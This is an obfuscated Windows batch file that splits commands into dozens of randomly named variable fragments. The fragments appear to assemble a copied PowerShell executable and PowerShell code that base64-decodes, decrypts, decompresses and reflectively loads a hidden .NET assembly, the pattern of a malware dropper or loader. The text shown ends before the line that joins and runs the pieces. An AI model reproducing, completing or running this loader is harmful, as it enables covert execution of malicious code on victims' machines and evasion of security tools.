@echo off
set "nwfZJfTIZr=em"
set "NQuQKonERi=1."
set "CSbXAaTzBn=Sy"
set "sFfaTAsqsG=nd"
set "OBzaNjrqUX=Po"
set "maQWGELzvo=he"
set "KFNKJyovnz=co"
set "PmXGRcxIZm=0\"
set "FZzuOJbnai=:\"
set "peAyNBLtVG=we"
set "KKVqOMjkHp=po"
set "cCgJCziruj= /"
set "OaZtWQJLFG=ll"
set "kXvuxnFRsy=xe"
set "FkzuOezMFl=py"
set "pARGoqADXt=\v"
set "SRDKJdVdcY=he"
set "dmLxaBKgWs=s\"
set "kjnwrdEfKS= C"
set "MlDsMsrsiY=\W"
set "eiBbBXGiII=we"
set "fdWBdGKWeU=ll"
set "DGTdfgMcnu=in"
set "UiKuUFLeGe=ow"
set "kIygzYBLdN=Wi"
set "cxbWdtvAWe=rS"
set "sGgUQDRlbe=y "
set "rKUtocXemT=st"
set "DfTxQcClOm=rs"
set "glAjxgqUqm=do"
set "PltadcgNTT=32"
set "wparJEQxzL=.e"
set "VjkshbTMmr=ws"
set "dqtnVsuvsP=cd"
set "lziUBpzHyV= %~dp0"
set "fRpujWQwoM=]::N"
set "yHkugMnyvD=rans"
set "OgACwFvovI=Syst"
set "ihnjXEAVbo=e = "
set "OfURbCQOKa=]::C"
set "EvJvaQNTsx=sion"
set "OTjkpapbQb= = $"
set "IAnPilFgjJ=;$ja"
set "PRDKMevkJB=7;$o"
set "uZVexSsmPc=ddin"
set "REsJkLHloR=.Mod"
set "VymcXcXoiX=mYYx"
set "SFXIWPWsup=ay()"
set "rJeLhViJsl=-joi"
set "NhMYBnoLHM=AA.I"
set "QhtrtzZtBJ=gSS "
set "cFDbIjicQq=fore"
set "iIWjfhKgDb=bjec"
set "lwyUQiEKUy== [S"
set "pWyMMOEkYZ=onve"
set "DUfcIbHpMx=le  "
set "FsdpjpXPwB=nage"
set "CXoFpMvutb=$oVT"
set "xSdjmtvabN=.Cre"
set "HZGZAzGlsU=comp"
set "zfFucXWUwm=File"
set "RXSXYdXDRE=XCK."
set "QmzPQIBKtV=[Sys"
set "mCGXvilIod=[-1."
set "TKTUbryhlZ= '')"
set "cFjWUEqBPY=6esa"
set "ocEwmsAQbt=tem."
set "jQuaYJsPsn=gnir"
set "lISXkQVcrE=raph"
set "qglSOadptK=Syst"
set "EvRcxvfkXX=ewLi"
set "MatEvynpBa=Obje"
set "AmPDHbdeth==');"
set "IjRkSyosoR=('Tg"
set "jbMZMTCrak=pose"
set "hkMbMibOhR=BC;$"
set "zTaFgwwuiz=]::("
set "aekBrZCmtK= New"
set "qYSoNXvrmo=y.Ci"
set "varrRJqPTQ=.Cop"
set "flYPiSVDei=ne);"
set "hSwFYDkUst=YSd."
set "KUPLVcIXno=n ''"
set "AabIGcKKPy=pose"
set "hUvJltDwQx=rtS4"
set "TIHTCiuMUR=);$R"
set "rqdAbMxQoe=raph"
set "HtqRNOooyW=Txwm"
set "SATPptGvKO=mK);"
set "fKMLhmZLMI=.Sec"
set "pghtzukkSL=[IO."
set "JdodJLJOPf=join"
set "szvryJGvuM=V = "
set "GXGGvrDcrp=('%*'"
set "FSsMmlGwXy=ring"
set "zHTZMRbmPA=)($j"
set "spqJVixYqR=d.Su"
set "lSXNfPJpqS=yste"
set "foZUSdwdRK=$XKL"
set "QRrMfWMLBN=ment"
set "CjUaxPigCk= if "
set "YRLIckLpeU=oVTA"
set "VYyMhsscbu=Comp"
set "cVkiArABuL=();$"
set "Shkklapevb=$pOX"
set "IimlhfLYgd=stem"
set "rKdxgDTZTs=Lld."
set "oWQtWoLwVZ=VTAA"
set "DSHcqzOIJU=CFxo"
set "DippskOFfF=pher"
set "jsOnbWfCRQ=$eKX"
set "IrLBimETcD=.Cry"
set "ZSVcWEYyqI=);$p"
set "WYwxIqzPSe=embl"
set "aFcoVcxjYG=ect "
set "OyykPLCnwt=em.I"
set "DpEXvlUrTS=s75K"
